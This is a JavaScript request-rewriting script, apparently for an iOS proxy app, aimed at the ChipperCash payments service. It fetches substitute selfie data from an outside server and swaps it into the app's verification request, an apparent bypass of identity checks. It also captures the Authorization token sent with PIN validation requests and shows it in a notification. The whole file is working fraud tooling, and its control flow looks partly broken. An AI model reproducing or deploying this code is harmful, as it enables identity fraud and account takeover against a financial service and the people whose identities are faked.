// 第一步：从指定 URL 获取新的 selfie 数据
const fetchNewSelfie = () => {
    const url = "https://mpfacetxt.myngn.top/getChipperContent.php";

    return new Promise((resolve, reject) => {
        const request = {
            url: url,
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                "request_chipper": true
            })
        };

        const xhr = new XMLHttpRequest();
        xhr.open(request.method, request.url, true);
        xhr.setRequestHeader("Content-Type", request.headers["Content-Type"]);

        xhr.onload = function() {
            if (xhr.status === 200) {
                let response_data = JSON.parse(xhr.responseText);
                resolve(response_data.file_content); // 返回新的 selfie 数据
            } else {
                console.log(`请求失败，HTTP 状态码：${xhr.status}`);
                reject(null);
            }
        };

        xhr.onerror = function() {
            console.log("请求失败，错误信息如下：");
            console.log(xhr.statusText);
            reject(null);
        };

        xhr.send(request.body);
    });
};

// 第二步：拦截请求并替换 selfie 数据
const interceptRequest = (newSelfie) => {
    let body = $request.body;
    let bodyObj = JSON.parse(body);

    if (newSelfie) {
        // 替换 selfie 字段
        if (bodyObj.selfie) {
            bodyObj.selfie = newSelfie;
        }
    } else {
        console.log("No new selfie data found.");
    }

    // 将修改后的 JSON 对象转回字符串
    body = JSON.stringify(bodyObj);

    // 返回修改后的请求体
    $done({ body });
};

// 执行流程
fetchNewSelfie().then(newSelfie => {
    // 拦截并修改 selfie 请求
    interceptRequest(newSelfie);
});

// 拦截并记录 Authorization token
const url = $request.url;
const headers = $request.headers;

if (url.includes("/pin/validate")) {
    const authorizationToken = headers['Authorization'];

    if (authorizationToken) {
        // 显示通知
        $notify("ChipperCash Token", "Authorization Token:", authorizationToken);
    } else {
        $notify("ChipperCash Token", "Authorization Token:", "未找到");
    }
}

$done({headers: headers});
